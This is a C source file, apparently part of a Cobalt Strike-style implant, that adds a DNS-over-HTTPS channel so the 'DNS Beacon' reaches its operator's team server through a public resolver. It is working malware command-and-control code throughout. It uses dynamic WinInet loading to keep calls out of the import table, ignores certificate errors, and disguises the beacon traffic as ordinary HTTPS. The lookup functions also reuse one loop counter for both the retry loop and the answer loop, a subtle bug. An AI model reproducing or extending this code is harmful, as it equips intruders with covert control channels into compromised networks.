/*
 * channel_doh.c - DNS-over-HTTPS transport for the DNS Beacon
 * (4.11 DoH Beacon parity: dns-beacon comm_mode "dns-over-https").
 *
 * The DNS Beacon keeps its record encoding (A / AAAA / TXT conversations
 * with the team server's DNS listener) and swaps only the carrier: instead
 * of DnsQuery_A against a UDP resolver, each DNS query is serialized into
 * wire format (RFC 1035) and POSTed as application/dns-message (RFC 8484)
 * to a DoH resolver, which forwards to the authoritative server - our team
 * server. The TS side is unchanged.
 *
 * Configuration rides the existing settings blob:
 *   SETTING_DOH_MODE      77  short  0/1 (profile: dns-beacon.comm_mode
 *                                      "dns-over-https")
 *   SETTING_DOH_SERVER    78  string https://host[:port]/dns-query
 *   SETTING_DOH_VERB      79  string POST (GET ?dns= is not implemented)
 *   SETTING_DOH_USERAGENT 80  string
 *   SETTING_DOH_ACCEPT    81  string application/dns-message
 *
 * Self-signed lab resolvers: the request ignores unknown-CA / CN / date
 * cert errors (production resolvers present valid certificates anyway).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include "beacon.h"
#include "channel.h"
#include "commands.h"

#define DOH_MAX_PACKET 4096
#define DOH_ATTEMPTS   3

static BOOL doh_ready_checked = FALSE;
static BOOL doh_ready = FALSE;
static char doh_host[256];
static INTERNET_PORT doh_port = 443;
static BOOL doh_secure = TRUE;
static char doh_path[256];

/* split "https://host[:port]/path" once at init */
static BOOL doh_init(void) {
	char url[512];
	char * p, * slash;
	char * server = setting_ptr(SETTING_DOH_SERVER);

	if (doh_ready_checked)
		return doh_ready;
	doh_ready_checked = TRUE;

	if (server == NULL || strlen(server) < 8)
		return FALSE;
	lstrcpynA(url, server, sizeof(url) - 1);

	p = url;
	if (strnicmp(p, "https://", 8) == 0) {
		doh_secure = TRUE;
		p += 8;
	}
	else if (strnicmp(p, "http://", 7) == 0) {
		doh_secure = FALSE;
		doh_port = 80;
		p += 7;
	}
	else {
		return FALSE;
	}

	slash = strchr(p, '/');
	if (slash != NULL) {
		lstrcpynA(doh_path, slash, sizeof(doh_path) - 1);
		*slash = 0;
	}
	else {
		lstrcpynA(doh_path, "/", sizeof(doh_path) - 1);
	}

	{
		char * colon = strchr(p, ':');
		if (colon != NULL) {
			*colon = 0;
			doh_port = (INTERNET_PORT)atoi(colon + 1);
		}
	}
	lstrcpynA(doh_host, p, sizeof(doh_host) - 1);

	if (strlen(doh_host) == 0)
		return FALSE;
	doh_ready = TRUE;
	return TRUE;
}

/* WinInet resolved dynamically: the winhttp build variant does not link
 * wininet.lib, and LoadLibrary keeps us out of any import table. */
static struct {
	HMODULE mod;
	HINTERNET (WINAPI *InternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
	HINTERNET (WINAPI *InternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
	HINTERNET (WINAPI *HttpOpenRequestA)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR *, DWORD, DWORD_PTR);
	BOOL (WINAPI *HttpSendRequestA)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
	BOOL (WINAPI *HttpQueryInfoA)(HINTERNET, DWORD, LPVOID, LPDWORD, LPDWORD);
	BOOL (WINAPI *InternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
	BOOL (WINAPI *InternetSetOptionA)(HINTERNET, DWORD, LPVOID, DWORD);
	BOOL (WINAPI *InternetCloseHandle)(HINTERNET);
} WI;

static BOOL doh_wininet(void) {
	if (WI.mod != NULL)
		return TRUE;
	WI.mod = LoadLibraryA("wininet.dll");
	if (WI.mod == NULL)
		return FALSE;
	WI.InternetOpenA = (HINTERNET (WINAPI *)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD))
		(void *)GetProcAddress(WI.mod, "InternetOpenA");
	WI.InternetConnectA = (HINTERNET (WINAPI *)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR))
		(void *)GetProcAddress(WI.mod, "InternetConnectA");
	WI.HttpOpenRequestA = (HINTERNET (WINAPI *)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR *, DWORD, DWORD_PTR))
		(void *)GetProcAddress(WI.mod, "HttpOpenRequestA");
	WI.HttpSendRequestA = (BOOL (WINAPI *)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD))
		(void *)GetProcAddress(WI.mod, "HttpSendRequestA");
	WI.HttpQueryInfoA = (BOOL (WINAPI *)(HINTERNET, DWORD, LPVOID, LPDWORD, LPDWORD))
		(void *)GetProcAddress(WI.mod, "HttpQueryInfoA");
	WI.InternetReadFile = (BOOL (WINAPI *)(HINTERNET, LPVOID, DWORD, LPDWORD))
		(void *)GetProcAddress(WI.mod, "InternetReadFile");
	WI.InternetSetOptionA = (BOOL (WINAPI *)(HINTERNET, DWORD, LPVOID, DWORD))
		(void *)GetProcAddress(WI.mod, "InternetSetOptionA");
	WI.InternetCloseHandle = (BOOL (WINAPI *)(HINTERNET))
		(void *)GetProcAddress(WI.mod, "InternetCloseHandle");
	return WI.InternetOpenA != NULL && WI.InternetConnectA != NULL
		&& WI.HttpOpenRequestA != NULL && WI.HttpSendRequestA != NULL
		&& WI.HttpQueryInfoA != NULL && WI.InternetReadFile != NULL
		&& WI.InternetCloseHandle != NULL;
}

BOOL doh_enabled(void) {
	if (setting_short(SETTING_DOH_MODE) == 0)
		return FALSE;
	return doh_init();
}

/* --- RFC 1035 wire codec ------------------------------------------- */

static int doh_build_query(const char * domain, unsigned short qtype,
                           unsigned char * out, int max) {
	unsigned char * p = out;
	const char * label = domain;
	int n;

	if (max < (int)(12 + strlen(domain) + 8))
		return -1;

	/* header - big-endian by byte (never through short stores: the host is
	 * little-endian and the wire is not) */
	p[0] = (unsigned char)((GetTickCount() >> 8) & 0xFF); /* id hi */
	p[1] = (unsigned char)(GetTickCount() & 0xFF);        /* id lo */
	p[2] = 0x01; p[3] = 0x00;   /* flags: RD=1 */
	p[4] = 0x00; p[5] = 0x01;   /* QDCOUNT = 1 */
	p[6] = 0x00; p[7] = 0x00;
	p[8] = 0x00; p[9] = 0x00;
	p[10] = 0x00; p[11] = 0x00;
	p += 12;

	/* QNAME labels */
	while (label != NULL && *label) {
		const char * dot = strchr(label, '.');
		n = dot ? (int)(dot - label) : (int)strlen(label);
		if (n <= 0 || n > 63 || p + n + 1 > out + max)
			return -1;
		*p++ = (unsigned char)n;
		memcpy(p, label, n);
		p += n;
		label = dot ? dot + 1 : NULL;
	}
	*p++ = 0;

	/* QTYPE / QCLASS, big-endian by byte */
	*p++ = (unsigned char)(qtype >> 8);
	*p++ = (unsigned char)(qtype & 0xFF);
	*p++ = 0x00;
	*p++ = 0x01;
	return (int)(p - out);
}

/* skip a (possibly compressed) name; returns bytes consumed or -1 */
static int doh_skip_name(const unsigned char * p, const unsigned char * end) {
	int total = 0;
	while (p < end) {
		unsigned char c = *p;
		if (c == 0)
			return total + 1;
		if ((c & 0xC0) == 0xC0) {
			if (p + 2 > end)
				return -1;
			return total + 2;
		}
		if (p + 1 + c > end)
			return -1;
		p += 1 + c;
		total += 1 + c;
	}
	return -1;
}

/* --- HTTP exchange -------------------------------------------------- */

static int doh_exchange(unsigned char * query, int qlen,
                        unsigned char * resp, int rmax) {
	HINTERNET session = NULL, connect = NULL, request = NULL;
	char * verb = setting_ptr(SETTING_DOH_VERB);
	char * ua = setting_ptr(SETTING_DOH_USERAGENT);
	char * accept = setting_ptr(SETTING_DOH_ACCEPT);
	const char * acceptTypes[2];
	char headers[512];
	DWORD read = 0, total = 0;
	DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
	                 | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
	                 | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
	int rv = -1;
	DWORD flags = 0;

	if (!doh_wininet())
		return -1;

	if (strlen(verb) == 0)
		verb = "POST";
	if (strlen(ua) == 0)
		ua = "Mozilla/5.0 (compatible)";
	if (strlen(accept) == 0)
		accept = "application/dns-message";
	acceptTypes[0] = accept;
	acceptTypes[1] = NULL;

	if (doh_secure)
		flags = INTERNET_FLAG_SECURE;
	flags |= INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE
	         | INTERNET_FLAG_NO_AUTO_REDIRECT;

	session = WI.InternetOpenA(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (session == NULL)
		goto done;
	connect = WI.InternetConnectA(session, doh_host, doh_port, NULL, NULL,
	                               INTERNET_SERVICE_HTTP, 0, 0);
	if (connect == NULL)
		goto done;
	request = WI.HttpOpenRequestA(connect, verb, doh_path, NULL, NULL,
	                               acceptTypes, flags, 0);
	if (request == NULL)
		goto done;
	WI.InternetSetOptionA(request, INTERNET_OPTION_SECURITY_FLAGS,
	                      &secFlags, sizeof(secFlags));

	_snprintf(headers, sizeof(headers) - 1,
	          "Content-Type: %s\r\nAccept: %s\r\n",
	          accept, accept);

	if (!WI.HttpSendRequestA(request, headers, (DWORD)-1L, query, qlen))
		goto done;

	{
		char code[8] = { 0 };
		DWORD len = sizeof(code) - 1;
		if (!WI.HttpQueryInfoA(request,
		               HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
		               code, &len, NULL))
			goto done;
		if (*(DWORD *)code != 200)
			goto done;
	}

	while (total < rmax) {
		if (!WI.InternetReadFile(request, resp + total, rmax - total, &read))
			goto done;
		if (read == 0)
			break;
		total += read;
	}
	if (total < 12)
		goto done;
	rv = total;

done:
	if (request != NULL) WI.InternetCloseHandle(request);
	if (connect != NULL) WI.InternetCloseHandle(connect);
	if (session != NULL) WI.InternetCloseHandle(session);
	return rv;
}

/* --- public API (mirrors the DnsQuery consumers' semantics) --------- */

/* A record -> raw 4 bytes in IpAddress (network order) */
unsigned int doh_lookup_a(char * domain) {
	unsigned char query[512], resp[DOH_MAX_PACKET];
	const unsigned char * p, * end;
	int qlen, rlen, n, i, answers;

	for (i = 0; i < DOH_ATTEMPTS; i++) {
		qlen = doh_build_query(domain, 1, query, sizeof(query));
		if (qlen < 0)
			return 0;
		rlen = doh_exchange(query, qlen, resp, sizeof(resp));
		if (rlen < 12)
			continue;

		p = resp + 12; end = resp + rlen;
		n = doh_skip_name(p, end);
		if (n < 0 || p + n + 4 > end)
			continue;
		p += n + 4;

		answers = (resp[6] << 8) | resp[7];
		for (i = 0; i < answers; i++) {
			unsigned short type, rdlen;
			n = doh_skip_name(p, end);
			if (n < 0 || p + n + 10 > end)
				break;
			type = (unsigned short)((p[n] << 8) | p[n + 1]);
			rdlen = (unsigned short)((p[n + 8] << 8) | p[n + 9]);
			p += n + 10;
			if (p + rdlen > end)
				break;
			if (type == 1 && rdlen >= 4) {
				unsigned int ip;
				memcpy(&ip, p, 4);
				return ip;
			}
			p += rdlen;
		}
	}
	return 0;
}

/* AAAA record -> 16 raw bytes, returns 16 or -1 */
int doh_lookup_aaaa(char * domain, char * out16) {
	unsigned char query[512], resp[DOH_MAX_PACKET];
	const unsigned char * p, * end;
	int qlen, rlen, n, i, answers;

	for (i = 0; i < DOH_ATTEMPTS; i++) {
		qlen = doh_build_query(domain, 28, query, sizeof(query));
		if (qlen < 0)
			return -1;
		rlen = doh_exchange(query, qlen, resp, sizeof(resp));
		if (rlen < 12)
			continue;

		p = resp + 12; end = resp + rlen;
		n = doh_skip_name(p, end);
		if (n < 0 || p + n + 4 > end)
			continue;
		p += n + 4;

		answers = (resp[6] << 8) | resp[7];
		for (i = 0; i < answers; i++) {
			unsigned short type, rdlen;
			n = doh_skip_name(p, end);
			if (n < 0 || p + n + 10 > end)
				break;
			type = (unsigned short)((p[n] << 8) | p[n + 1]);
			rdlen = (unsigned short)((p[n + 8] << 8) | p[n + 9]);
			p += n + 10;
			if (p + rdlen > end)
				break;
			if (type == 28 && rdlen >= 16) {
				memcpy(out16, p, 16);
				return 16;
			}
			p += rdlen;
		}
	}
	return -1;
}

/* TXT record -> concatenated character-strings of the first TXT answer */
int doh_lookup_txt(char * domain, char * buffer, int max) {
	unsigned char query[512], resp[DOH_MAX_PACKET];
	const unsigned char * p, * end;
	int qlen, rlen, n, i, answers, t = 0;

	for (i = 0; i < DOH_ATTEMPTS; i++) {
		qlen = doh_build_query(domain, 16, query, sizeof(query));
		if (qlen < 0)
			return -1;
		rlen = doh_exchange(query, qlen, resp, sizeof(resp));
		if (rlen < 12)
			continue;

		p = resp + 12; end = resp + rlen;
		n = doh_skip_name(p, end);
		if (n < 0 || p + n + 4 > end)
			continue;
		p += n + 4;

		answers = (resp[6] << 8) | resp[7];
		for (i = 0; i < answers; i++) {
			unsigned short type, rdlen, used;
			n = doh_skip_name(p, end);
			if (n < 0 || p + n + 10 > end)
				break;
			type = (unsigned short)((p[n] << 8) | p[n + 1]);
			rdlen = (unsigned short)((p[n + 8] << 8) | p[n + 9]);
			p += n + 10;
			if (p + rdlen > end)
				break;
			if (type == 16) {
				used = 0;
				while (used < rdlen) {
					unsigned char sl = p[used];
					used++;
					if (used + sl > rdlen)
						break;
					if (t + (int)sl >= max)
						return -2;
					memcpy(buffer + t, p + used, sl);
					t += sl;
					used += sl;
				}
				return t;
			}
			p += rdlen;
		}
	}
	return -1;
}
